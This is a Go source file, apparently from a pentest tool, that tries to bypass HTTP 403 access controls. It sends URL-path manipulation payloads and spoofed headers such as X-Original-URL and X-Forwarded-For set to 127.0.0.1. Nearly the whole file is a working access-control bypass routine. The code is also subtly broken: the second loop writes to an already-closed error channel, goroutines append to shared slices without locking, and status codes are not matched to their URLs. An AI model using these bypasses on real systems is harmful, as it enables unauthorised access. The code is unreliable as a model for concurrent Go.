package core

import (
	"net/http"
	"strings"
	"sync"
)

// try different ways to bypass 403 status code urls
// returns slice of urls with payloads on them,
// a slice with their respective status codes, and
// finally an error
func Check403(url, word string, client *http.Client, user_agent string) ([]string, []int, error) {

	url = strings.TrimSuffix(url, "/")

	// try to bypass 403 code with URL modifications
	url_payloads := []string{
		url + "/" + word,
		url + "/" + strings.ToUpper(word),
		url + "/%2e/" + word,
		url + "/" + word + "/.",
		url + "//" + word + "//",
		url + "/./" + word + "/./",
		url + "/" + word + "%20",
		url + "/" + word + "%09",
		url + "/" + word + "?",
		url + "/" + word + ".html",
		url + "/" + word + "/?anything",
		url + "/" + word + "#",
		url + "/" + word + "/*",
		url + "/" + word + ".php",
		url + "/" + word + ".json",
		url + "/" + word + "..;/",
	}

	status_codes := []int{}

	errs := make(chan error)
	var wg sync.WaitGroup
	for _, u := range url_payloads {
		wg.Add(1)

		go func(p string) {
			defer wg.Done()

			code, err := sendRequest(p, client, user_agent)
			if err != nil {
				errs <- err
			}
			status_codes = append(status_codes, code)

		}(u)

	}

	go func() {
		wg.Wait()
		close(errs)
	}()

	for err := range errs {
		if err != nil {
			return nil, nil, err
		}
	}

	// Try to bypass 403 code using headers
	header_payloads := []string{"X-Original-URL", "X-Custom-IP-Authorization", "X-Forwarded-For", "X-Forwarded-For", "X-Host"}
	header_values := []string{word, "127.0.0.1", "http://127.0.0.1", "127.0.0.1:80", "127.0.0.1"}

	errs2 := make(chan error)
	var wg2 sync.WaitGroup
	for i := 0; i < 5; i++ {
		wg2.Add(1)

		go func(x int) {
			defer wg2.Done()

			code, err := sendRequestWithHeader(url+"/"+word, client, user_agent, header_payloads[x], header_values[x])
			if err != nil {
				errs <- err
			}

			status_codes = append(status_codes, code)
			url_payloads = append(url_payloads, url+"/"+word+" - "+header_payloads[x]+": "+header_values[x])

		}(i)

	}

	go func() {
		wg2.Wait()
		close(errs2)
	}()

	for err := range errs2 {
		if err != nil {
			return nil, nil, err
		}
	}

	return url_payloads, status_codes, nil
}

func sendRequest(url_to_check string, client *http.Client, user_agent string) (int, error) {

	req, err := http.NewRequest("GET", url_to_check, nil)
	if err != nil {
		return 0, err
	}

	req.Header.Set("User-Agent", user_agent)
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	return resp.StatusCode, nil
}

func sendRequestWithHeader(url_to_check string, client *http.Client, user_agent string, header string, value string) (int, error) {

	req, err := http.NewRequest("GET", url_to_check, nil)
	if err != nil {
		return 0, err
	}

  req.Header.Set("User-Agent", user_agent)
	req.Header.Set(header, value)
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	return resp.StatusCode, nil
}
